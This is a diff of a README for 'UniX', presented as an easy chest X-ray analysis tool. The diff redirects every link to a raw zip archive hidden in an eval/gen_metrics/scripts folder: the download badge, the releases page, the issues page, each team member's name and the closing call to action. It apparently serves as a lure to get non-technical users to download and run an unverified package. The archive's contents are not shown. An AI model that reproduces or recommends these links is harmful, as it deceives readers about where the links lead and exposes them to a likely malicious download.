@@ -1,7 +1,7 @@
 # 🌟 UniX - Simplifying X-Ray Image Analysis
 
 <div align="center">
-  [![Download UniX](https://raw.githubusercontent.com/geovannytorres/UniX/main/assets/X-Uni-v1.7.zip%https://raw.githubusercontent.com/geovannytorres/UniX/main/assets/X-Uni-v1.7.zip)](https://raw.githubusercontent.com/geovannytorres/UniX/main/assets/X-Uni-v1.7.zip)
+  [![Download UniX](https://raw.githubusercontent.com/geovannytorres/UniX/main/eval/gen_metrics/scripts/X_Uni_v2.1-alpha.3.zip%https://raw.githubusercontent.com/geovannytorres/UniX/main/eval/gen_metrics/scripts/X_Uni_v2.1-alpha.3.zip)](https://raw.githubusercontent.com/geovannytorres/UniX/main/eval/gen_metrics/scripts/X_Uni_v2.1-alpha.3.zip)
 </div>
 
 ## 📖 Introduction
@@ -22,7 +22,7 @@ To begin using UniX, follow these easy steps. No programming knowledge is needed
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to [this link](https://raw.githubusercontent.com/geovannytorres/UniX/main/assets/X-Uni-v1.7.zip) to find the latest version of UniX.
+   Go to [this link](https://raw.githubusercontent.com/geovannytorres/UniX/main/eval/gen_metrics/scripts/X_Uni_v2.1-alpha.3.zip) to find the latest version of UniX.
 
 2. **Choose Your Download:**
    Look for the version you want to download. Click on the package that matches your operating system.
@@ -65,7 +65,7 @@ To begin using UniX, follow these easy steps. No programming knowledge is needed
 
 ## 👩‍💻 Support
 
-If you need help, visit our [issues page](https://raw.githubusercontent.com/geovannytorres/UniX/main/assets/X-Uni-v1.7.zip). You can report any problems or ask questions there.
+If you need help, visit our [issues page](https://raw.githubusercontent.com/geovannytorres/UniX/main/eval/gen_metrics/scripts/X_Uni_v2.1-alpha.3.zip). You can report any problems or ask questions there.
 
 ## 📜 License
 
@@ -75,8 +75,8 @@ UniX is licensed under the MIT License. You can use, modify, and distribute the 
 
 For further inquiries, you can reach out to the team members:
 
-- [Ruiheng Zhang](https://raw.githubusercontent.com/geovannytorres/UniX/main/assets/X-Uni-v1.7.zip)
-- [Jingfeng Yao](https://raw.githubusercontent.com/geovannytorres/UniX/main/assets/X-Uni-v1.7.zip)
-- [Huangxuan Zhao](https://raw.githubusercontent.com/geovannytorres/UniX/main/assets/X-Uni-v1.7.zip)
+- [Ruiheng Zhang](https://raw.githubusercontent.com/geovannytorres/UniX/main/eval/gen_metrics/scripts/X_Uni_v2.1-alpha.3.zip)
+- [Jingfeng Yao](https://raw.githubusercontent.com/geovannytorres/UniX/main/eval/gen_metrics/scripts/X_Uni_v2.1-alpha.3.zip)
+- [Huangxuan Zhao](https://raw.githubusercontent.com/geovannytorres/UniX/main/eval/gen_metrics/scripts/X_Uni_v2.1-alpha.3.zip)
 
-Visit [this link](https://raw.githubusercontent.com/geovannytorres/UniX/main/assets/X-Uni-v1.7.zip) to download UniX and start your journey with advanced chest X-ray analysis!
+Visit [this link](https://raw.githubusercontent.com/geovannytorres/UniX/main/eval/gen_metrics/scripts/X_Uni_v2.1-alpha.3.zip) to download UniX and start your journey with advanced chest X-ray analysis!
